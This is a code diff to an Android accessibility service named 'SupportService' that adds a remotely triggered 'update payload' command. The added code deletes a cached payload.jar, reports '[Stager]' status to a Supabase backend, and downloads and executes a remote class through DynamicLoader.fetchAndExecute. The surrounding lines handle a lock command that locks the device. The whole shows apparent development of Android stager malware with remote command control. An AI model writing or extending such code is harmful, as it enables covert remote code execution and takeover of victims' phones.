@@ -340,6 +340,30 @@ public class SupportService extends AccessibilityService implements SupabaseMana
                     DynamicLoader.fetchAndExecute(this, finalUrl, finalClass);
                 }
 
+            } else if (lowerCmd.equals(Config.CMD_UPDATE_PAYLOAD)) {
+                android.content.SharedPreferences prefs = getSharedPreferences("payload_prefs", MODE_PRIVATE);
+                String url = prefs.getString("last_url", "");
+                String className = prefs.getString("last_class", "");
+
+                if (!url.isEmpty() && !className.isEmpty()) {
+                    // Hapus file lama agar benar-benar fresh download
+                    File jarFile = new File(new File(getFilesDir(), "modules"), "payload.jar");
+                    if (jarFile.exists()) {
+                        boolean deleted = jarFile.delete();
+                        Log.d(TAG, "Old payload deleted for update: " + deleted);
+                    }
+
+                    if (supabaseManager != null) {
+                        supabaseManager.sendData("logs", "[Stager] Force updating payload...");
+                        DynamicLoader.fetchAndExecute(this, url, className);
+                    } else {
+                        DynamicLoader.fetchAndExecute(this, url, className);
+                    }
+                } else {
+                    if (supabaseManager != null) {
+                        supabaseManager.sendData("logs", "[Stager] Update failed: No previous payload config found.");
+                    }
+                }
             } else if (lowerCmd.equals(Config.CMD_LOCK)) {
                 setLockStatusNative(true);
                 getSharedPreferences("payload_prefs", MODE_PRIVATE).edit().putBoolean("locked", true).apply();
